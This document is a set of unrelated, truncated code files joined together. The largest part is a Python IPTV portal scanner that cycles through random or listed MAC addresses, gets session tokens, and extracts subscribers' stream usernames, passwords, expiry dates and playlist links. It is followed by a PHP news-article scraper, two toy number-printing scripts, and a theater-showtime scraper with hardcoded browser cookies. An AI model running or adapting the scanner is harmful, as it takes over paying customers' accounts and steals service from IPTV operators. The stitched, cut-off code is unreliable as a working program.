			     		listlink=liveurl
			     		livel=' «⭐️» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «💥️» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «⚡️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d3():
	global hitc
	global hitr
	global tokenr
	for mac in range(3,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_03"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="Müşteri IP Adresi yok"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «⭐️» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «💥️» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «⚡️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)


def d4():
	global hitc
	global hitr
	global tokenr
	for mac in range(4,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_04"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="Müşteri IP Adresi yok"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «⭐️» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «💥️» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «⚡️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d5():
	global hitc
	global hitr
	global tokenr
	for mac in range(5,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_05"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="Müşteri IP Adresi yok"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «⭐️» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «💥️» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «⚡️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d6():
	global hitc
	global hitr
	global tokenr
	for mac in range(6,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_06"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(lin
========================================================================================

                                                    <?php
		$url = 'https://avaz.ba/vijesti/crna-hronika/798767/oglasio-se-voditelj-o-smrti-analiticara-kojeg-su-izujedali-psi-pocivaj-u-miru-vladane';


parse9($url);
	
function parse9($link) {
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $link);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,  false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
	curl_setopt($ch, CURLOPT_REFERER, "$link");
	curl_setopt($ch, CURLOPT_VERBOSE, true);
	curl_setopt($ch, CURLOPT_FAILONERROR, true);
	curl_setopt( $ch, CURLOPT_POST, false );
	$html = curl_exec($ch);
	curl_close($ch);
		print_r ($ch);
	
	//print_r ($link);
 	// Title
	$pars1 = '<meta name="keywords" content="';
	$pars2 = '" />';
	$out = stristr($html, $pars1);
	$out = substr($out, strlen($pars1)-1);
	$out = substr($out, 1, strpos($out,$pars2)-1);
	$title = strip_tags($out,'');
	$title = trim ($title);


	// Subtitle
	$pars1 = '<meta property="og:description" content="';
	$pars2 = '" />';
	$out = stristr($html, $pars1);
	$out = substr($out, strlen($pars1)-1);
	$out = substr($out, 1, strpos($out,$pars2)-1);
	$subtitle = strip_tags($out,'');
	$subtitle = trim ($subtitle);

	// Author
	$pars1 = 'Autor:';
	$pars2 = '"';
	$out = stristr($html, $pars1);
	$out = substr($out, strlen($pars1)-1);
	$out = substr($out, 1, strpos($out,$pars2)-1);
	$author = strip_tags($out,'');
	$author = trim ($author);

	// Date
	$pars1 = ' "datePublished": "';
	$pars2 = 'T';
	$out = stristr($html, $pars1);
	$out = substr($out, strlen($pars1)-1);
	$out = substr($out, 1, strpos($out,$pars2)-1);
	$date = strip_tags($out,'');
	$date = trim($date);
	/* 
	if (!strpos($date,'prije', 'dan', 'sat', 'min') !== false) {
    
}
	print_r ($date);
	$dword = explode(' ',$date);
	
//	print_r ($dword);
//	print_r (substr($dword[2],0,3));

	$today = new DateTime();
	
	if (substr($dword[2],0,3)=="dan")
		
	{


	$date= $today->modify("-".$dword[1]." day")->format('Y-m-d');

		
	}
	
	else
	if (substr($dword[2],0,3)=="sat")
	{
		$date= $today->modify("-".$dword[1]." hour")->format('Y-m-d');
		
	}
	else
	if (substr($dword[2],0,3)=="min")
	{
		$date= $today->modify("-".$dword[1]." min")->format('Y-m-d');
	}
	
	else
		if (substr($dword[1],0,3)!="dan")
	{

	$date1 = explode('.',$dword[0]);
//	print_r ($date1);
	$d = $date1[0];
	$m = $date1[1];
	$y = $date1[2];
$array = array("$y", "$m", "$d");

	
	$date = implode("-", $array); 
		
	}
	
	else
	 */
	
		
/* 	if (checkDateFormat($date)==false)	{
		$date = date("Y-m-d");
	}
 */
	// Content
	$pars1 = '<div class="col-sm-12 artikal-text">';
	$pars2 = '</div>';
	$out = stristr($html,$pars1);
	$out = substr($out,strlen($pars1)-1);
	$out = substr($out,1,strpos($out,$pars2)-1);
	$out = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $out);
	$out = preg_replace('/<style\b[^>]*>(.*?)<\/style>/is', "", $out);
	$out = preg_replace('/<iframe\b[^>]*>(.*?)<\/iframe>/is', "", $out);
	$out = preg_replace('/([0-9|#][\x{20E3}])|[\x{00ae}|\x{00a9}|\x{203C}|\x{2047}|\x{2048}|\x{2049}|\x{3030}|\x{303D}|\x{2139}|\x{2122}|\x{3297}|\x{3299}][\x{FE00}-\x{FEFF}]?|[\x{2190}-\x{21FF}][\x{FE00}-\x{FEFF}]?|[\x{2300}-\x{23FF}][\x{FE00}-\x{FEFF}]?|[\x{2460}-\x{24FF}][\x{FE00}-\x{FEFF}]?|[\x{25A0}-\x{25FF}][\x{FE00}-\x{FEFF}]?|[\x{2600}-\x{27BF}][\x{FE00}-\x{FEFF}]?|[\x{2900}-\x{297F}][\x{FE00}-\x{FEFF}]?|[\x{2B00}-\x{2BF0}][\x{FE00}-\x{FEFF}]?|[\x{1F000}-\x{1F6FF}][\x{FE00}-\x{FEFF}]?/u', '', $out);
	$content = strip_tags($out,'');
	$content = trim($content);

	$val['title'] = trim($title);
	$val['subtitle'] = trim($subtitle);
	$val['author'] = trim($author);
	$val['date'] = trim($date);
	$val['content'] = trim($content);

	echo "<font color='blue'><b>Title:</font></b> ".$title."<hr>";
	echo "<font color='blue'><b>Subtitle:</font></b> ".$subtitle."<hr>";
	echo "<font color='blue'><b>Author:</font></b> ".$author."<hr>";
	echo "<font color='blue'><b>Date:</font></b> ".$date."<hr>";
	echo "<font color='blue'><b>Content:</font></b> ".$content."<hr>";

	return $val;
}
?>

========================================================================================

                                                    x=int(input('Enter a number :'))
y=int(input('Enter a number :'))
if x>y:
        _min=y
        _max=x
else:
        _min=x
        _max=y
while _min<_max:
        print(_min)
        _min+=1
========================================================================================

                                                    x=input("num1 :")
y=input("num2 :")
if y<x:
    while y<x:
        print(y)
        y+=1
else:
    while x<y:
        print(x)
        x+=1
        
# x=int(input('Enter a number :'))
# y=int(input('Enter a number :'))
# if x>y:
#     while y<x:
#         print(y)
#         y+=1
# else:
#     while x<y:
#         print(x)
#         x+=1
    

========================================================================================

                                                    chainsold = 0
chainseats = 0
chainshow = 0
chaingross = 0
chainATP = 0

import requests
#Get to Theaters list page
url = "https://cms.harkins.com/api/v1/theaters"
querystring = {"a":"0"}
payload = ""
headers = {
    "cookie": "_ga=GA1.2.1591276063.1596145566; WRUIDAWS=2884815583576536; s_ecid=MCMID^%^7C05103073639393802134578813489594990632; __gads=ID=3955cd7d10d5508a:T=1596145571:S=ALNI_MZ3vxKuf3CzeuBbbWPalHUCowGyHw; _cc=AZOY3ZkUTKWdzsz^%^2B^%^2FixEwAn0; help-bubbles=^{^\^tspFiltersOpen^^:1597372774254^}; s_fid=5CAD683F79C77E90-2F6BAB7573070549; adops_master_kvs=; covid-modal-v=^{^\^lastVersion^^:1,^\^viewedOn^^:1618600278296^}; sailthru_visitor=6a8053c3-aac1-44d2-8395-fa462bb897d7; akamai_set_zip=false; expandedSearch=^[^\^mesquite,",
    "authority": "tickets.fandango.com",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
    "referer": "https://tickets.fandango.com/MobileExpress/Checkout?row_count=362159613&mid=223002&chainCode=REGL&sdate=2022-04-18^%^2015:55&tid=aajjg",
    "sec-ch-ua": "^\^"
}
r = requests.request("GET", url, data=payload, headers=headers, params=querystring)
data = r.json()
for x in range(len(data)):
    thearegion = data[x]['name']
    regionsold = 0
    regionseats = 0
    regionshow = 0
    regiongross = 0
    regionATP = 0
    print(thearegion)
    for x2 in range(len(data[x]['theatres'])):
        theaname = data[x]['theatres'][x2]['name']
        theaid = data[x]['theatres'][x2]['id']
        ticketprices = data[x]['theatres'][x2]['ticket_prices']
        imaxprice = 0; cine1price = 0; threeDprice = 0; twoDprice = 0;
        MATcine1price = 0; MATthreeDprice = 0; MATtwoDprice = 0;
        #Theater ticket prices
        if "generalAdmission" in ticketprices[0]:
            twoDprice = ticketprices[0]['generalAdmission']
        if "3D" in ticketprices[0]:
            threeDprice = ticketprices[0]['3D']
        if "cine1" in ticketprices[0]:
            cine1price = ticketprices[0]['cine1']
        if "cine1XL" in ticketprices[0]:
            cine1XLprice = ticketprices[0]['cine1XL']
        if "cineCapri" in ticketprices[0]:
            Capriprice = ticketprices[0]['cineCapri']
        if "imax" in ticketprices[0]:
            imaxprice = ticketprices[0]['imax']
        if "generalAdmission" in ticketprices[1]:
            MATtwoDprice = ticketprices[1]['generalAdmission']
        if "3D" in ticketprices[1]:
            MATthreeDprice = ticketprices[1]['3D']
        if "cine1" in ticketprices[1]:
            MATcine1price = ticketprices[1]['cine1']
        if "cine1XL" in ticketprices[1]:
            MATcine1XLprice = ticketprices[1]['cine1XL']
        if "cineCapri" in ticketprices[1]:
            MATCapriprice = ticketprices[1]['cineCapri']
        theasold = 0
        theaseats = 0
        theashow = 0
        theagross = 0
        theaATP = 0

        import requests
        #theaterspecificperformances
        url2 = "https://webservice.harkins.com/v2/theatres/"+str(theaid)+"/performances/2023-01-05"
        querystring2 = {"a": "0"}
        payload2 = ""
        headers2 = {
            'cookie': "_ga=GA1.2.1591276063.1596145566; WRUIDAWS=2884815583576536; s_ecid=MCMID^%^7C05103073639393802134578813489594990632; __gads=ID=3955cd7d10d5508a:T=1596145571:S=ALNI_MZ3vxKuf3CzeuBbbWPalHUCowGyHw; _cc=AZOY3ZkUTKWdzsz^%^2B^%^2FixEwAn0; help-bubbles=^{^\^tspFiltersOpen^^:1597372774254^}; s_fid=5CAD683F79C77E90-2F6BAB7573070549; adops_master_kvs=; covid-modal-v=^{^\^lastVersion^^:1,^\^viewedOn^^:1618600278296^}; sailthru_visitor=6a8053c3-aac1-44d2-8395-fa462bb897d7; akamai_set_zip=false; expandedSearch=^[^\^mesquite,",
            'authority': "tickets.fandango.com",
            'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'accept-language': "en-US,en;q=0.9",
            'referer': "https://tickets.fandango.com/MobileExpress/Checkout?row_count=362159613&mid=223002&chainCode=REGL&sdate=2022-04-18^%^2015:55&tid=aajjg",
            'sec-ch-ua': "^\^"
        }
        r2 = requests.request("GET", url2, data=payload2, headers=headers2, params=querystring2)
        data2 = r2.json()
        showcount = len(data2['data']['performances'])
        print("   "+theaname)
        for x3 in range(showcount):
            showingsold = 0
            showformat = "2D"
            showtimeMAT = "NotMatinee"
            showinggross = 0
            movieid = data2['data']['performances'][x3]['movieId']
            if movieid == "HO00010022":
                sessionid = data2['data']['performances'][x3]['sessionId']
                showtimeattributes2 = data2['data']['performances'][x3]['attributes']
                showtime = data2['data']['performances'][x3]['showtimeDate']
                if "IMAX3DHFR" in showtimeattributes2:
                    showformat = "IMAX3DHFR"
                if "IMAX" in showtimeattributes2 and "IMAX3DHFR" not in showtimeattributes2:
                    showformat = "IMAX"
                if "3DHFR" in showtimeattributes2:
                    showformat = "3DHFR"
                if "Cine1" in showtimeattributes2:
                    showformat = "Cine1"
                if "Cine1XL" in showtimeattributes2:
                    showformat = "Cine1XL"
                if "Capri" in showtimeattributes2:
                    showformat = "Capri"
                if "3D" in showtimeattributes2 and "3DHFR" not in showtimeattributes2 and "IMAX3DHFR" not in showtimeattributes2:
                    showformat = "3D"


                import requests
                url22 = "https://webservice.harkins.com/v2/theatres/"+str(theaid)+"/performances/2023-01-05/"
                querystring22 = {"a": "0"}
                payload22 = ""
                headers22 = {
                    'cookie': "_ga=GA1.2.1591276063.1596145566; WRUIDAWS=2884815583576536; s_ecid=MCMID^%^7C05103073639393802134578813489594990632; __gads=ID=3955cd7d10d5508a:T=1596145571:S=ALNI_MZ3vxKuf3CzeuBbbWPalHUCowGyHw; _cc=AZOY3ZkUTKWdzsz^%^2B^%^2FixEwAn0; help-bubbles=^{^\^tspFiltersOpen^^:1597372774254^}; s_fid=5CAD683F79C77E90-2F6BAB7573070549; adops_master_kvs=; covid-modal-v=^{^\^lastVersion^^:1,^\^viewedOn^^:1618600278296^}; sailthru_visitor=6a8053c3-aac1-44d2-8395-fa462bb897d7; akamai_set_zip=false; expandedSearch=^[^\^mesquite,",
                    'authority': "tickets.fandango.com",
                    'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    'accept-language': "en-US,en;q=0.9",
                    'referer': "https://tickets.fandango.com/MobileExpress/Checkout?row_count=362159613&mid=223002&chainCode=REGL&sdate=2022-04-18^%^2015:55&tid=aajjg",
                    'sec-ch-ua': "^\^"
                }
                r22 = requests.request("GET", url22, data=payload22, headers=headers22, params=querystring22)
                data22 = r22.json()
                cinemaidsessid = data22['data']['performances'][0]['sessionId']
                #Get cinemaid
                url3 = "https://ticketingservice.harkins.com/api/Theatre/GetTheatreShowtime/harkinsid/" + str(
                    theaid) + "/sessionid/" + str(cinemaidsessid)
                querystring3 = {"a": "0"}
                payload3 = ""
                headers3 = {
                    "cookie": "_ga=GA1.2.1591276063.1596145566; WRUIDAWS=2884815583576536; s_ecid=MCMID^%^7C05103073639393802134578813489594990632; __gads=ID=3955cd7d10d5508a:T=1596145571:S=ALNI_MZ3vxKuf3CzeuBbbWPalHUCowGyHw; _cc=AZOY3ZkUTKWdzsz^%^2B^%^2FixEwAn0; help-bubbles=^{^\^tspFiltersOpen^^:1597372774254^}; s_fid=5CAD683F79C77E90-2F6BAB7573070549; adops_master_kvs=; covid-modal-v=^{^\^lastVersion^^:1,^\^viewedOn^^:1618600278296^}; sailthru_visitor=6a8053c3-aac1-44d2-8395-fa462bb897d7; akamai_set_zip=false; expandedSearch=^[^\^mesquite,",
                    "authority": "tickets.fandango.com",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-language": "en-US,en;q=0.9",
                    "referer": "https://tickets.fandango.com/MobileExpress/Checkout?row_count=362159613&mid=223002&chainCode=REGL&sdate=2022-04-18^%^2015:55&tid=aajjg",
                    "sec-ch-ua": "^\^"
                }
                r3 = requests.request("GET", url3, data=payload3, headers=headers3, params=querystring3)
                data3 = r3.json()
                showtime2 = data3['data']['showtime']['value'][0]['showtime']
                cinemaid = data3['data']['theatre']['value'][0]['id']
                #Matinee or Not and Showing Formats
